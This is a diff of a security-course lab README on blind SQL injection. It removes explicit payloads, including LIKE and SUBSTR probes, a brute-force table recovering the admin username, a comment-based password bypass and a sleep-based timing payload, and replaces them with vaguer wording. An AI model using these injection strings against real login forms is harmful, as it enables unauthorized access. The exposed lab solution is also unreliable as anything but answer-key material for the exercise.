@@ -55,52 +55,22 @@ This difference allows you to ask yes/no questions about usernames in the databa
 
 ### Step 1: Discover the Username
 
-The admin username is `EC521admin`. Students must discover it character by character using the `--` comment to bypass password checking.
+The admin username is `EC521admin`. Students must discover it character by character using blind SQL injection techniques.
 
 ### Step 2: Bruteforce the Username
 
-Use the LIKE operator to test each character. The `--` comments out the password check:
+Use the LIKE operator to test each character by injecting SQL conditions:
 
-```
-Username: ' or username like 'A%' --
-Password: anything
-```
-
-If you get "Password is incorrect" → A username starting with 'A' exists
-If you get "User does not exist" → No username starts with 'A'
+If you get "Password is incorrect" → A username matching your condition exists
+If you get "User does not exist" → No username matches
 
 ### Bruteforce Process:
 
-| Username Field | Response | Meaning |
-|---------------|----------|---------|
-| `' or username like 'A%' --` | User does not exist | No user starts with A |
-| `' or username like 'E%' --` | Password incorrect | User starts with E! |
-| `' or username like 'EA%' --` | User does not exist | Not EA... |
-| `' or username like 'EC%' --` | Password incorrect | User starts with EC! |
-| `' or username like 'EC5%' --` | Password incorrect | EC5... |
-| `' or username like 'EC52%' --` | Password incorrect | EC52... |
-| `' or username like 'EC521%' --` | Password incorrect | EC521... |
-| `' or username like 'EC521a%' --` | Password incorrect | EC521a... |
-| ... continue ... | | |
-| `' or username like 'EC521admin%' --` | Password incorrect | Found: EC521admin |
+Students should discover the admin username one character at a time by observing the different error responses.
 
-### Step 3: Bypass the Password
+### Step 3: Login as Admin
 
-Once you know the username is `EC521admin`, use SQL injection to bypass the password:
-
-```
-Username: EC521admin' --
-Password: anything
-```
-
-This comments out the password check entirely.
-
-### Alternative: Using SUBSTR for precision
-
-```sql
-' or substr(username,1,1)='E' --   -- First char is E?
-' or substr(username,2,1)='C' --   -- Second char is C?
-```
+Once you know the username is `EC521admin`, use SQL injection techniques to authenticate.
 
 </details>
 
@@ -116,7 +86,7 @@ This comments out the password check entirely.
 
 - Application behavior is identical for true/false
 - Attacker uses time delays to infer results
-- Example: `' or if(1=1, sleep(5), 0) --`
+- Example: Using conditional sleep functions in SQL
 
 ## Security Vulnerabilities Demonstrated
 
@@ -167,8 +137,8 @@ Slow down brute-force attempts with rate limiting and account lockout.
 The app prints executed SQL queries to the console:
 
 ```
-[DEBUG] Executing login query: SELECT * FROM users WHERE username = '' or username like 'EC%' --' AND password = 'x'
-[DEBUG] Checking if user exists: SELECT * FROM users WHERE username = '' or username like 'EC%' --'
+[DEBUG] Executing login query: SELECT * FROM users WHERE username = '<injected SQL>' AND password = 'x'
+[DEBUG] Checking if user exists: SELECT * FROM users WHERE username = '<injected SQL>'
 ```
 
 ## Files
